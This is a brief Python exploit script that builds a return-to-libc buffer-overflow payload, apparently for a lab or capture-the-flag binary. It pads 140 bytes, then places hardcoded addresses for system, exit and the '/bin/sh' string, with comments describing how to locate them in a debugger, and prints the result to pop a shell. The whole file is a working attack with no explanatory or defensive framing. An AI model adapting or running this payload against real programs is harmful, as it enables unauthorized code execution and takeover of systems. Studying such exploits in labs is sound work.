system = 0xb7e6b060     # print &system once libc table loaded
exit = 0xb7e5ebe0       # print &exit once libc table loaded
shell_str = 0xb7f8cc58  # find &system, +999999999, "/bin/sh"

offset = 'A'*140
payload = '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1]

print (offset + payload)
